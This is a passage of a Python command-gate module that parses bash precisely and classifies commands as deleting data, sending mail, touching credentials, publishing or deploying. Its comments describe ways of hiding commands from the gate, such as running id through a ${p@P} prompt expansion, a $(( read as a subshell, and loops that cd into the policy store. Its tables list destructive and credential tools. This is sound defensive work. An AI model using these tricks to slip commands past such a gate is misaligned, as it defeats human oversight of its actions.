                if ends is not None:
                    ends[at] = k
                if not f[1]:
                    stack.pop()
                    if not stack:
                        return k
            continue
        nxt = s[k + 1:k + 2]
        if ch == "\\":
            k += 2
        elif ch == "`":
            k = _skip(s, k + 1, "`", True)
        elif ch == "$" and nxt == "(":
            stack.append(["a", [], k + 1] if s.startswith("$((", k) else ["c", 0, k + 1])
            k += 1                                       # its ( is counted in it
        elif ch == "$" and nxt == "{" and f[0] != "a":
            stack.append(["b", 0, k])
            k += 2
        elif f[0] == "d" or (ch == '"' and f[0] == "b"):
            if f[0] == "b":
                f[1] = not f[1]
            elif ch == '"':
                stack.pop()
                if not stack:
                    return k + 1
            k += 1
        elif (ch == "'" or (ch == "$" and nxt == "'")) and not (f[0] == "b" and f[1]):
            k = _skip(s, k + (2 if ch == "$" else 1), "'", ch == "$")
        elif f[0] == "b":
            if ch == "}" and not f[1]:
                stack.pop()
            k += 1
        elif ch == '"':
            stack.append(["d", 0, k + 1])
            k += 1
        elif ch == "#" and f[0] == "c" and s[k - 1] in " \t\n;|&()" and s[k - 2:k - 1] != "\\":
            j = s.find("\n", k)
            k = n if j < 0 else j
        elif ch in "()":
            f[1] += 1 if ch == "(" else -1
            k += 1
            if f[1] == 0:
                stack.pop()
                if not stack:
                    return k
        else:
            k += 1
    if ends is not None:
        ends.update(dict.fromkeys((at for f in stack if f[0] == "a" for at in f[1]), -1))
    return -1


def _arith_end(s: str, i: int, ends: dict[int, int]) -> int:
    """Where bash's parser ends the $(( at s[i]: just past the ) that matches the ( at s[i + 1], or -1 (_group_end)."""
    return _group_end(s, i + 1, "a", ends)


def _expand_end(s: str, i: int, end: int) -> int:
    """Where bash's second reading of the $(( at s[i], when it expands the word (extract_command_subst), ends the text
    from s[i + 2]: just past the `)` that closes it, or -1 when none does before ``end``, where the parser ended the
    word. Unlike the parser it takes a `#` after a blank or a newline for a comment and steps over '..' with no
    escapes, $'..' too; a nested $( ) is read as the parser reads one (_group_end)."""
    k, depth = i + 2, 1
    while (m := _GROUP_STOP.search(s, k, end)) is not None:
        k, ch = m.start(), m.group()
        if ch == "\\":
            k += 2
        elif ch == "#" and s[k - 1] in " \t\n":
            j = s.find("\n", k, end)
            k = end if j < 0 else j
        elif ch == "$" and s.startswith("$(", k) and not s.startswith("$((", k):
            k = _group_end(s, k + 1, "c")
            k = end + 1 if k < 0 else k
        elif ch == "`":
            k = _skip(s, k + 1, "`", True)
        elif ch == "'":
            k = _skip(s, k + 1, "'", False)
        elif ch == '"':
            k = _group_end(s, k + 1, "d")
            k = end + 1 if k < 0 else k
        else:
            depth += {"(": 1, ")": -1}.get(ch, 0)
            k += 1
            if depth == 0:
                return k
    return -1


def _hides_paren(s: str, i: int, end: int) -> bool:
    """Whether bash's parser may match the $(( at s[i] otherwise than a count of every parenthesis, which ends it at
    ``end`` too when it does not: a quote, an escape, a backquote or a `#` in it, or a ${..} in a $( ) nested in it,
    whose parentheses the parser does not count but chk_arithsub does (_is_arith)."""
    return bool(_HIDES_PAREN.search(s, i, end)) or (s.find("${", i, end) >= 0 and s.find("$(", i + 2, end) >= 0)


def _arith_group(s: str, i: int, ends: dict[int, int]) -> int:
    """The end of the $(( at s[i] when bash reads it as arithmetic, else -1: the parser ends it (_arith_end), bash's
    second reading ends it at the same place (_expand_end), and the text between is a group that balances
    (_is_arith). Else bash runs that text as a $( ) holding a subshell (#553)."""
    end = _arith_end(s, i, ends)
    if end < 0:
        return -1
    if _hides_paren(s, i, end):
        if not _is_arith(s[i + 2:end - 1]):
            return -1
        if ("#" in s[i:end] or "$'" in s[i:end]) and _expand_end(s, i, end) != end:   # else both end alike
            return -1
    elif ends.get(i + 2) != end - 1:              # with no quote, escape or comment the text balances when its
        return -1                                 # first ( closes at its last )
    # bash checks the group as it prints a nested $( ) back, with its comments dropped and its here-documents
    # rewritten, which the gate does not model: such a group is read as a $( ) (stricter than bash)
    k = i + 3
    while (m := _SUBST.search(s, k, end)) is not None:
        k = _group_end(s, m.end() - 1, "c")
        k = end if k < 0 else k
        if _COMMENT_OR_HEREDOC.search(s, m.start(), k):
            return -1
    return end


def _is_arith(t: str) -> bool:
    """bash reads a $(( as arithmetic when the text between its `$(` and the `)` that ends it, ``t``, is a group
    ( .. ) whose inside balances, with only escapes and quotes skipped: '..', $'..' and "..", which steps over what is
    nested in it (bash's chk_arithsub)."""
    if len(t) < 2 or t[0] != "(" or t[-1] != ")":
        return False
    count, k, t = 0, 0, t[1:-1]
    while (m := _ARITH_STOP.search(t, k)) is not None:
        k, ch = m.start(), m.group()
        if ch == "\\":
            k += 2
        elif ch == "'" or t.startswith("$'", k):
            k = _skip(t, k + (2 if ch == "$" else 1), "'", ch == "$")
        elif ch == '"':
            end = _group_end(t, k + 1, "d")
            k = len(t) if end < 0 else end
        else:
            count += {"(": 1, ")": -1}.get(ch, 0)
            if count < 0:
                return False
            k += 1
    return count == 0


def _arith_body(s: str, a: int, b: int) -> bool:
    """chk_arithsub, bash's test of the text between a `$((` and its `))` as an arithmetic string (#553):
    with single-quoted, double-quoted and backslash-hidden spans skipped, the unquoted parens balance and
    no `)` comes before a `(`. Backquoted bodies are read as text, parens in them count."""
    depth, j = 0, a
    while j < b:
        ch = s[j]
        if ch == "\\":
            j += 2
        elif ch in "'\"":
            j = min(_skip(s, j + 1, ch, ch == '"'), b)
        else:
            depth += (ch == "(") - (ch == ")")
            if depth < 0:
                return False
            j += 1
    return depth == 0


def _dollar_paren(s: str, i: int) -> int:
    """Where the `$((` at s[i] ends when bash reads it as arithmetic, 0 when bash runs the span as a command
    substitution instead (#553): bash closes the `$( ` at the first `)` outside single-quoted, double-quoted,
    backquoted and backslash-hidden text, a `#` after a blank starting a comment, and reads the span as
    arithmetic only when the text between the parens, quoted spans skipped, holds balanced parens; else it
    runs it as `$( ( )`, a subshell whose commands run. When no `)` closes the `$( ` at all, bash cannot
    parse the line and runs nothing, and the span is read as arithmetic text to the end of the line, as
    before."""
    n, depth, j = len(s), 1, i + 2
    while j < n:
        ch = s[j]
        if ch == "\\":
            j += 2
        elif ch in "'\"":
            j = _skip(s, j + 1, ch, ch == '"')
        elif ch == "`":
            j = _skip(s, j + 1, "`", True)
        elif ch == "#" and s[j - 1] in " \t\n":
            k = s.find("\n", j)
            j = n if k < 0 else k
        else:
            depth += (ch == "(") - (ch == ")")
            j += 1
            if depth == 0:
                break
    if depth:
        return n
    if s[j - 2:j - 1] != ")" or not _arith_body(s, i + 3, j - 2):
        return 0
    return j


# The operators after which bash quotes single-quoted text even inside double quotes (a pattern, a case
# change, `@`, an error message): `"${f%'$x'}"` expands nothing, `"${f:-'$x'}"` expands $x. A subscript is
# read only up to the next bracket, so a long run of `${a[` costs one step each (a nested subscript there
# counts as no operator, and the text stays visible).
_DQ_QUOTING_OP = re.compile(r"[!#]?(?:[A-Za-z_]\w*|\d+|[-@*#?$!])(?:\[[^\][]*\])?(?:[#%/^,~@?]|:\?)")

# The ${ of a prompt transformation (#579): a parameter, an array element, a positional parameter or one of its
# ranges, with `@P` for its operator. With promptvars on, the default, bash expands the value as a prompt string
# and runs its command substitutions, so the value is code the gate cannot see (`printf -v p '%s(%s)' '$' 'id';
# echo ${p@P}` runs id, and the value can rebuild a form the gate reads only as written, a `/` substitution of a
# store variable, #342). The operator is read only where the parameter ends, so `${x:-foo@P}` stays a default
# word, and an operator after an indirection (`${!x@P}`) is not read here.
_RUNS_PROMPT = re.compile(r"\$\{((?:[A-Za-z_]\w*|\d+)(?:\[[^\][{}]*\])?|[@*](?::[^\][{}]*)?)@P\}")


def _dollar_brace(s: str, i: int, dq: bool = False, nest: int = 0) -> tuple[str, int, dict[int, list]]:
    """bash's reading of the `${` at s[i]: (its text with what bash does not expand blanked, the index of
    its closing `}`, len(s) if none, and start: [close, parent start] for every `${` met on the way, one
    that never closes closing at len(s)). Only a `}` outside quotes and escapes closes it, and only a
    nested `${` opens another (a bare `{` does not). Blanked: escaped characters, a ` ` or $( ) (it runs in
    a subshell), and single-quoted or $'..' text, except where bash still expands it: in double quotes
    (`dq`) after an operator other than _DQ_QUOTING_OP's (`"${a:-'$x'}"`); a `${` in such text is read
    within it. One pass over s from i, every character once, so a long or deeply nested line stays linear
    (classify runs inside the gate hook). `nest` is the lexer's (_NEST)."""
    frames: dict[int, list] = {}

    def open_(at: int, brace: int, dq: bool, parent: int | None) -> list:
        # [in a "..." inside it, sq expands, dq, start]
        frames[at] = [len(s), parent]
        return [False, dq and not _DQ_QUOTING_OP.match(s, brace + 1), dq, at]

    def quoted_text(a: int, b: int, parent: int) -> str:
        # single-quoted text bash expands: the visible text, and the frames of the ${ in it, read within it
        seg = s[a:b]
        vis = re.sub(r"\\.", "  ", seg, flags=re.S)
        p = vis.find("${")
        while p >= 0:
            _, close, inner = _dollar_brace(seg, p, False, nest)
            for at, (end, up) in inner.items():
                frames[a + at] = [a + end, parent if up is None else a + up]
            p = vis.find("${", close + 1)
        return vis

    b = _joins_past(s, i + 1)    # bash drops a \<newline> before it reads the { (#585)
    # one entry per ${ still open, no recursion
    out, stack, j = ["${", " " * (b - i - 1)], [open_(i, b, dq, None)], b + 1
    while j < len(s):
        inq, sq, fdq, start = stack[-1]
        ch, k = s[j], j + 1
        if ch == "\\":
            k = min(j + 2, len(s))
            out.append(" " * (k - j))
        elif s.startswith("$'", j) and not inq:      # where bash expands '..' it expands $'..' too
            k = _skip(s, j + 2, "'", True)
            out.append(" " + quoted_text(j + 1, k, start) if sq else " " * (k - j))
        elif ch == "'" and not inq:
            k = _skip(s, j + 1, "'", False)
            out.append(quoted_text(j, k, start) if sq else " " * (k - j))
        elif ch == "`" or (s.startswith("$(", j) and not s.startswith("$((", j)):
            if ch == "`":
                k = _skip(s, j + 1, "`", True)
            elif nest >= _NEST:
                k = _nest_end(s, j + 2, [])[0]
            else:
                lx = _Lexer(s, scan=False, nest=nest + 1)
                lx.i = j + 2
                lx.run(closer=True)
                k = lx.i
            out.append(" " * (k - j))
        elif s.startswith("${", j):
            stack.append(open_(j, j + 1, fdq or inq, start))
            out.append("${")
            k = j + 2
        elif ch == "}" and not inq:
            frames[start][0] = j
            stack.pop()
            out.append("}")
            if not stack:
                return "".join(out), j, frames
        else:
            stack[-1][0] = inq ^ (ch == '"')
            out.append(ch)
        j = k
    return "".join(out), len(s), frames


def _literal_heredoc(toks: list) -> str | None:
    """`cat <<'EOF' ... EOF` inside $( ) is the heredoc text, not a command the gate must classify."""
    toks = [t for t in toks if t != ("op", ";")]
    if len(toks) == 2 and toks[0][0] == "w" and toks[0][1].text == "cat" and not toks[0][1].dynamic \
            and toks[1][0] == "hd" and not toks[1][1].ambiguous:
        hd = toks[1][1]
        if hd.quoted or not re.search(r"\$|`", hd.body):
            return hd.body
    return None


# What one top-level classify_shell call has read (#334): each line parsed once, and classified once per depth for
# each state of the call's budgets (_brace_budget, _exo_relative). The budgets only fall, so a line met again after
# one fell is read again and spends it again. Every $( ) is listed at each level above it, so a nest of n levels was
# classified about n**4 / 24 times without this.
_shell_seen: contextvars.ContextVar[dict | None] = contextvars.ContextVar("exo_gate_shell_seen", default=None)
# #143, #553: the lexer reads ${..} words and $(( as bash's parser reads them (_Lexer.bash). The reading before, a
# ${..} word to its first } and a $(( to the ) that balances every parenthesis, is kept: classify reads a call that
# way too (_flat_words) when the two may differ anywhere in it (_two_ways, set by _Lexer._differ), and decide keeps
# the stricter (readings). So a line bash's reading lowers, through a part it adds that leads the line, keeps its
# decision, and the words dash (the /bin/sh fallback) ends at their first } are read as dash reads them.
_flat_words: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_flat_words", default=False)
_two_ways: contextvars.ContextVar[list[bool] | None] = contextvars.ContextVar("exo_gate_two_ways", default=None)
# A lexer that reads only the words of a line (_policy_command_view) opens no part only bash's reading opens: it finds
# where each ends, as for a part past the cap, and the line's own parse reads it (_Lexer._part).
_words_only: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_words_only", default=False)
# The folder a line entered by `cd` into the store or a descriptor folder (_classify_simple's store_cwd and fd_cwd),
# for the $( ), backticks and <( ) it runs there (#465): (True, the descriptor folder or ""), or None.
_cd_into: contextvars.ContextVar[tuple | None] = contextvars.ContextVar("exo_gate_cd_into", default=None)
# Set while classify reads a call (#479): [again, met]. A loop body runs again after its own `cd` into a store folder,
# so the commands before that `cd` run there on a later pass. On the call's first reading (`again` off) a line with
# such a loop sets `met`, and classify then reads the call again with `again` on, where each such loop's second pass
# adds its parts (_loop_again) and sets `met` when it adds any. A third item counts the lines classify_shell reads
# afresh (#479 verify): up on the first reading, down from the second reading's budget (_LOOP_BUDGET) on the second,
# which a line past it ends (_LoopBudget). None outside classify.
_loop_pass: contextvars.ContextVar[list[int] | None] = contextvars.ContextVar("exo_gate_loop_pass", default=None)
# The second reading's budget (#479 verify), in lines classify_shell reads afresh: this many more than the first
# reading read. A nest of loops in $( ) (`while :; do echo $(while ..; done); cp ..; cd ~/.exo/policies; done`)
# reads each body in two folders on every level, and the memo (_shell_seen) keys a line by the budgets left too, so
# such a nest cost that reading several times what the first one did (about 6 times main's time from 5 levels deep).
# Past the budget the call fails closed (_loop_reading), so the second reading reads afresh about as many lines as
# main's reading does, plus this many.
_LOOP_BUDGET = 64


class _LoopBudget(Exception):
    pass


# #853: bash reads `time`, `time -p`, `time --`, `time -p --` and `!` before a pipeline as prefixes of it, so a
# compound command after them (`time for ..; done`, `! time { ..; }`) runs as it does without them. _parse reads
# `time` as a program that takes options (_PREFIXES), so the compound after it is that program's argv. Set while
# classify reads a call (_classify_read): [seen], which _parse_line sets when a line holds such a `time` before a
# compound opener (_time_prefix). classify then reads the call again with _opening on, where _parse_line leaves out
# those `time`, `-p` and `--` words and opens the compound after them, as without them. Main's reading stays beside.
_timed: contextvars.ContextVar[list[bool] | None] = contextvars.ContextVar("exo_gate_timed", default=None)
_opening: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_opening", default=False)
# The compound openers bash runs behind a pipeline prefix, which _parse reads as a program's argv behind `time`,
# `coproc`, whose compound _parse opens only in command position (`time coproc for ..; done`, bash -n accepts it),
# and `function`, whose body _parse reads behind `time` or `!` alone but not behind both (`time ! function f {..}`).
_TIMED = frozenset({"for", "while", "until", "select", "if", "case", "{", "coproc", "function"})
# The reserved words after which bash takes `time` as the reserved word (time_command_acceptable), beside `!` and
# the start of a command that no `|` or `|&` feeds; `(`, `)`, `;`, `&`, `&&`, `||` and a newline end a command here.
_TIME_AFTER = frozenset({"{", "do", "then", "else", "elif", "if", "while", "until"})


def _time_prefix(toks: list, i: int) -> list[int]:
    """#853: the indexes of the `time`, `-p` and `--` words of the pipeline prefixes that start at toks[i], a `time`
    bash takes as the reserved word (_time_at), when a compound opener (_TIMED) follows them; else []. bash takes
    `-p` right after `time` and `--` right after either, once each (`time -p -p for` and `time -- -p for` are syntax
    errors), and after them another `time` or a `!`. A quoted word is never one of them."""
    drop: list[int] = []
    n = len(toks)
    while i < n and toks[i][0] == "w" and not toks[i][1].quoted:
        if toks[i][1].text == "time":
            drop.append(i)
            i += 1
            for opt in ("-p", "--"):
                if i < n and toks[i][0] == "w" and not toks[i][1].quoted and toks[i][1].text == opt:
                    drop.append(i)
                    i += 1
        elif toks[i][1].text == "!":
            i += 1
        else:
            break
    return drop if i < n and toks[i][0] == "w" and not toks[i][1].quoted and toks[i][1].text in _TIMED else []


def _time_at(cur: "_Cmd", toks: list, i: int) -> bool:
    """#853: whether bash takes the unquoted `time` at toks[i], a word in command position, as the reserved word:
    after the `!` words that start the command or follow one of _TIME_AFTER, at the start of a command no `|` or `|&`
    feeds (a newline after `|` is a `;` to the lexer, and bash still takes the command after it as fed)."""
    if cur.redirs or cur.heredocs or cur.herestrings:
        return False
    j = len(cur.words)
    while j and not cur.words[j - 1].quoted and cur.words[j - 1].text == "!":
        j -= 1
    if j:
        return not cur.words[j - 1].quoted and cur.words[j - 1].text in _TIME_AFTER
    k = i - len(cur.words) - 1
    while k >= 0 and toks[k] == ("op", ";"):
        k -= 1
    return not cur.piped_in and not (k >= 0 and toks[k][0] == "op" and toks[k][1] in ("|", "|&"))


# Whether the next line read is fed a stdin whose text the gate cannot read (#316): a >( ) body, a $( ) that
# inherits such a stdin, the remote command of an ssh that passes its stdin on. The mark travels here, not as a
# classify_shell argument: classify_shell is a seam other code wraps with a callable of (cmd, depth), so its
# signature keeps the shape it had. classify_shell takes the mark for the one line it names and clears it;
# _classify_fed sets it for each line it hands over.
_fed_stdin: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_fed_stdin", default=False)

# Set while classify reads a shell call (#584): [join, changed]. classify_shell sets `changed` when a line it reads,
# nested ones too, holds a backslash-newline in a `$` form (_join_dollars), and with `join` reads it joined. classify
# reads the call with `join` only when its first read set `changed`. None outside a shell call's classify.
_joining: contextvars.ContextVar[list[bool] | None] = contextvars.ContextVar("exo_gate_joining", default=None)
_DOLLAR_OR_PAIR = re.compile(r"\\.|\$", re.S)
_LINE_JOIN = re.compile(r"\\(.)", re.S)


def _joins_past(s: str, i: int) -> int:
    while s.startswith("\\\n", i):
        i += 2
    return i


def _join_dollars(s: str) -> str:
    """``s`` with each backslash-newline bash drops in a `$` form taken out (#584): right after the `$`, in a ${..}
    up to its own `}`, between `$(` and the `(` of `$((`, and in a $((..)) up to its close. bash drops each one
    outside single quotes before it reads a word, so `"$\\<newline>(cmd)"` runs cmd as "$(cmd)" does, and
    `${PA\\<newline>TH:=x}` sets PATH, while the lexer read a `$` and then a backslash as a literal `$`, and a ${..}
    or a $((..)) as it stands. A backslash before a backslash or a `$` escapes it, as outside single quotes. The
    rest is taken as it stands: in single quotes, a comment or a quoted here-doc bash keeps them, and the joined
    text is then still quoted or unread, or read again by a shell that drops them too. Linear in len(s)."""
    if "$" not in s or "\\\n" not in s:
        return s
    out, i = [], 0
    while (m := _DOLLAR_OR_PAIR.search(s, i)) is not None:
        j = m.end()
        if m.group() == "$":
            k = _joins_past(s, j)
            if s.startswith("{", k):
                depth, j = 1, k + 1             # to its own `}`: a nested ${..} (`${a[${b}0,P\\<nl>ATH=5]}`) opens one
                while j < len(s) and depth:
                    depth += {"}": -1, "{": s[j - 1] == "$"}.get(s[j], 0)
                    j += 2 if s[j] == "\\" else 1
            elif s.startswith("(", k) and s.startswith("(", _joins_past(s, k + 1)):
                depth, j = 2, _joins_past(s, k + 1) + 1
                while j < len(s) and depth:
                    depth += {"(": 1, ")": -1}.get(s[j], 0)
                    j += 2 if s[j] == "\\" else 1
            else:
                j = k
            out += [s[i:m.start() + 1], _LINE_JOIN.sub(lambda x: "" if x.group(1) == "\n" else x.group(), s[m.end():j])]
        else:
            out.append(s[i:j])
        i = j
    return "".join(out) + s[i:]


# The signal of an ssh part that runs the stdin its line was fed, a stdin the gate cannot read (#316). An ssh whose
# remote command is that line passes its own stdin on to it, so it runs that stdin too: `ssh a ssh b`, `ssh a 'cd /;
# ssh b'`, `ssh a ssh b ssh c`. The ssh around reads it from a reading of its remote command it keeps for that alone,
# and a >( ) body takes it off its own result (_classify_sub), so it names the line it is on.
_LINE_STDIN = "runs its line's stdin"


def _parse(src: str) -> tuple[list[_Cmd], list[str], bool]:
    """(simple commands, substitution sources, defines a function). Within one classify_shell call a line is parsed
    once (_shell_seen) and the result shared: no caller changes it."""
    seen = _shell_seen.get()
    if seen is None:
        return _parse_line(src)
    if ("parse", src) not in seen:
        seen[("parse", src)] = _parse_line(src)
    return seen[("parse", src)]


class _PipeTexts:
    """The pipeline texts that a line's stdin readers carry as their own text (#394, _runs_stdin), each built once.
    Each text holds every command before its reader, so a long pipeline of readers (`x|sh|sh|..`) would hold the
    square of its length. So together they hold at most four times the line's length plus 4 KB, and a reader past
    that has no own text."""

    def __init__(self, lx: _Lexer) -> None:
        self.lx, self.left = lx, 4 * len(lx.s) + 4096
        self.built: dict[tuple[int, int], str | None] = {}

    def text(self, a: int, b: int) -> str | None:
        if (a, b) not in self.built:
            fits = b - a <= self.left
            self.built[(a, b)] = self.lx._source(a, b) if fits else None
            self.left -= b - a if fits else 0
        return self.built[(a, b)]


def _parse_line(src: str) -> tuple[list[_Cmd], list[str], bool]:
    lx = _Lexer(src or "")
    toks = lx.run()
    marks = lx.marks
    pipes = _PipeTexts(lx)
    fnames = {a or b for a, b in _FUNC_NAMES.findall(src or "")}   # a call to one may run `exec < f` (#161)
    cmds: list[_Cmd] = []
    cur = _Cmd()
    func = False
    i = 0
    owners: list = []       # per open `(`: the command whose unquoted NAME=( it opens, or None
    after = None            # the command whose next words follow its NAME=(..) as more operands (#188)
    opened: list = []       # compounds still open: (opener, index of their first command, command piped in)
    tops: dict = {}         # opener -> its indexes in opened, so a closer finds its opener without a scan
    shut = None             # the open compound the current command closes
    shut_met = 0            # the subs met by the closer of shut
    loop = None             # the reserved word `for` or `select` that opened the latest loop
    lead = True             # every word of cur so far is a reserved word
    head, pre = True, 0     # the next word is in command position, as with lead and also after `coproc [NAME]`,
                            # `function NAME` and reserved words after them. Only `do` uses it (#436). pre is where
                            # cur's words after its latest leading reserved words start
    taken: dict = {}        # first command -> (end, an exec inside set the shell's stdin) of a compound whose
                            # stdin is set (inner closers win); also _piped_text's memo
    o_first = o_body = o_end = -1   # cur's own text: where its tokens start, where those after its reserved words do, its end
    o_tok = -1                      # the index of cur's last token
    p_at = -1                       # where the pipeline cur is in starts, when only simple commands came before it
    parens = 0                      # `(` tokens open here, counted apart from the compounds (#479 verify)
    ariths: list = []               # per `for ((` still open: (parens before its `((`, the command holding the `for`)
    arith = -1                      # the command holding a `for` whose `((..))` just closed, until the next token
    timed, opening = _timed.get(), _opening.get()
    prefix: set[int] = set()        # #853: the `time`, `-p` and `--` words of pipeline prefixes before a compound

    def end(piped: bool = False) -> None:
        nonlocal cur, shut, lead, head, o_first, o_body, o_end, o_tok, p_at
        if shut is not None:
            _feed_compound(cmds, shut[1], cur, shut[2], taken, fnames)
        at = o_first if o_body < 0 else o_body
        if cur.words or cur.redirs or cur.heredocs or cur.herestrings:
            cur.own = lx._source(at, o_end)
            cur.subs_met = lx.met[o_tok]
            cur.opens = (shut[1], shut_met) if shut is not None else None
            if cur.piped_in and p_at >= 0:
                cur.pipe_src = functools.partial(pipes.text, p_at, o_end)   # read only by _stdin_own
            cmds.append(cur)
        else:
            at = -1
        # the next command's pipeline starts here, or where this one's did; a compound before it has no such text.
        # A command piped from a compound (piped_group) finds p_at at -1, as the end before it had a compound shut.
        p_at = (p_at if cur.piped_in else at) if piped and shut is None and at >= 0 else -1
        cur, shut, lead, head = _Cmd(piped_in=piped, piped_group=piped and shut is not None), None, True, True
        o_first = o_body = o_end = o_tok = -1

    def push(entry: tuple) -> None:
        tops.setdefault(entry[0], []).append(len(opened))
        opened.append(entry)

    def close(j: int) -> None:
        nonlocal shut, shut_met
        shut, shut_met = opened[j], lx.met[i]
        del opened[j:]
        for stack in tops.values():
            while stack and stack[-1] >= j:
                stack.pop()

    while i < len(toks):
        kind, v = toks[i]
        if arith >= 0 and (kind, v) != ("op", ";"):
            # #479 verify: a `{` after `for ((..))` (a `;` or newline between) is the loop's body, whatever words
            # the arithmetic holds; _parse reads its pieces as commands, which may start with a reserved word.
            if kind == "w" and not v.quoted and v.text == "{" and not cur.words:
                cur.arith_for = arith
            arith = -1
        if kind in ("redir", "hd") and cur.words:
            cur.words[-1].redir_after = True
        if kind == "op":
            if v == "(":
                parens += 1
            elif v == ")" and parens:
                parens -= 1
                if ariths and ariths[-1][0] == parens:
                    arith = ariths.pop()[1]
            last = cur.words[-1] if cur.words else None
            # a NAME=( after an earlier NAME=(..) is still an operand of that earlier command
            opens = (after if after is not None else cur) if last and not last.quoted and last.text.endswith("=") else None
            if v == "(" and cur.words and toks[i + 1:i + 2] == [("op", ")")]:
                func = True
                i += 2
                end()
                after = opens
                continue
            after = owners.pop() if v == ")" and owners else None
            owners += [opens] if v == "(" else []
            into = cmds[-1] if v == "(" and cur.piped_in and cmds else None
            end(piped=v in ("|", "|&"))
            if v == "(":
                push(("(", len(cmds), into))
            elif v == ")" and opened and opened[-1][0] == "(":
                close(len(opened) - 1)
        elif kind == "redir":
            if i + 1 < len(toks) and toks[i + 1][0] == "w":
                if v == "<<<":
                    cur.herestrings.append(toks[i + 1][1])
                else:
                    cur.redirs.append((v, toks[i + 1][1]))
                a, o_end, o_tok = marks[i][0], marks[i + 1][1], i + 1
                o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 else o_body)
                i += 2
                continue
        elif kind == "hd":
            cur.heredocs.append(v)
            (a, o_end), o_tok = marks[i], i
            o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 else o_body)
        else:
            if i not in prefix and not v.quoted and v.text == "time" and _command_word(cur.words, head, pre) \
                    and _time_at(cur, toks, i):
                prefix.update(_time_prefix(toks, i))
                if timed is not None and i in prefix:
                    timed[0] = True
            if opening and i in prefix:
                i += 1              # #853: read as without the prefix, the compound after it opened (_opening)
                continue
            if not v.quoted and v.text == "do" and len(cur.words) > 1 and cur.words[-2] is loop:
                end()   # `for NAME do` (no `in`, no `;`): bash opens the body here, as after `for NAME;` (#436)
            cw = not v.quoted and _command_word(cur.words, head, pre)
            loop = v if cw and v.text in ("for", "select") else loop     # also `function f { for x do` (#436)
            if not v.quoted and v.text == "for" and toks[i + 1:i + 3] == [("op", "("), ("op", "(")]:
                ariths.append((parens, len(cmds)))     # cur, which holds this `for`, is cmds[len(cmds)] once ended
            if not v.quoted and _command_word(cur.words, lead, 0):
                if v.text in _COMPOUND_OPENERS:
                    push((v.text, len(cmds), cmds[-1] if cur.piped_in and cmds else None))
                elif v.text in _COMPOUND_CLOSERS:
                    j = max((tops[o][-1] for o in _COMPOUND_CLOSERS[v.text] if tops.get(o)), default=-1)
                    if j >= 0:
                        close(j)
            lead = lead and not v.quoted and v.text in _OPENERS
            pre, head = (len(cur.words) if head else pre), cw and v.text in _OPENERS
            (a, o_end), o_tok = marks[i], i
            o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 and not lead else o_body)
            cur.words.append(v)
            if after is not None:
                after.operands.append(v)
        i += 1
    end()
    if lx.left_open and lx.bash:
        # bash rejects a line that ends inside a quote and runs nothing, but where the lexer ends a quote otherwise
        # than the shell, the shell may close it and run the rest (dash, the /bin/sh fallback, #143): an odd part.
        # The reading before stays as it was (_differ), so the part never turns the line into one a rule allows.
        lx._odd()
    return cmds, lx.subs, func


def split_commands(cmd: str) -> tuple[list[list[str]], list[str]]:
    """Argv lists of a command line's simple commands, and its heredoc bodies."""
    cmds, _, _ = _parse(cmd)
    return [[w.text for w in k.words] for k in cmds if k.words], [h.body for k in cmds for h in k.heredocs]


# Prefix commands that run the rest of the line, and their options that take a value.
_PREFIXES = {"sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T"}, "doas": {"-u", "-C"},
             "env": {"-u", "-C", "-P", "--unset", "--chdir"}, "nohup": set(), "time": {"-o", "-f"},
             "command": set(), "exec": {"-a"}, "nice": {"-n"}, "ionice": {"-c", "-n", "-p"}, "builtin": set(),
             "caffeinate": {"-t", "-w"}, "timeout": {"-s", "-k", "--signal", "--kill-after"},
             "stdbuf": {"-i", "-o", "-e"}}
_OPENERS = {"if", "then", "elif", "else", "do", "while", "until", "{", "}", "!", "fi", "done", "esac"}
# openers that may follow a `coproc` or `function` NAME (`( list )` is split by the lexer and never a word)
_COMPOUND = frozenset({"{", "while", "until", "if", "for", "case", "select", "[["})
_SYSTEM_BIN = {"/bin", "/usr/bin", "/usr/local/bin", "/opt/homebrew/bin", "/sbin", "/usr/sbin",
               "/usr/local/sbin", "/opt/local/bin"}
_ENV_BIN = re.compile(r"(^|/)(\.?venv|env|\.tox/[^/]+|\.nox/[^/]+)/bin/[^/]+$|(^|/)node_modules/\.bin/[^/]+$")

# program -> category, when the program alone decides it
PROGRAMS = {
    "rm": "delete", "rmdir": "delete", "shred": "delete", "unlink": "delete", "srm": "delete",
    "mkfs": "delete", "wipefs": "delete", "dd": "delete",
    "sendmail": "email_send", "mail": "email_send", "mailx": "email_send", "mutt": "email_send",
    "msmtp": "email_send", "swaks": "email_send",
    "ssh-keygen": "credentials", "ssh-add": "credentials", "passwd": "credentials", "secret-tool": "credentials",
    "crontab": "schedule",
}

# (program, subcommand) -> category
SUBCOMMANDS = {
    ("npm", "publish"): "publish", ("yarn", "publish"): "publish", ("pnpm", "publish"): "publish",
    ("twine", "upload"): "publish", ("cargo", "publish"): "publish", ("gem", "push"): "publish",
    ("poetry", "publish"): "publish", ("uv", "publish"): "publish", ("docker", "push"): "publish",
    ("hatch", "publish"): "publish", ("npm", "unpublish"): "delete",
    ("fly", "deploy"): "deploy_production", ("flyctl", "deploy"): "deploy_production",
    ("wrangler", "deploy"): "deploy_production", ("wrangler", "publish"): "deploy_production",
    ("firebase", "deploy"): "deploy_production", ("terraform", "apply"): "deploy_production",
    ("pulumi", "up"): "deploy_production", ("kubectl", "apply"): "deploy_production",
    ("helm", "upgrade"): "deploy_production", ("helm", "install"): "deploy_production",
    ("terraform", "destroy"): "delete", ("pulumi", "destroy"): "delete", ("kubectl", "delete"): "delete",
    ("helm", "uninstall"): "delete", ("docker", "rm"): "delete", ("docker", "rmi"): "delete",
    ("gcloud", "auth"): "credentials", ("aws", "configure"): "credentials", ("op", "signin"): "credentials",
    ("az", "login"): "credentials", ("npm", "login"): "credentials",
    ("security", "add-generic-password"): "credentials", ("security", "delete-generic-password"): "credentials",
    ("launchctl", "load"): "schedule", ("launchctl", "bootstrap"): "schedule", ("systemctl", "enable"): "schedule",
}

# The allowlist. Programs that only read, and known programs that write only locally.
READ_PROGRAMS = frozenset("""
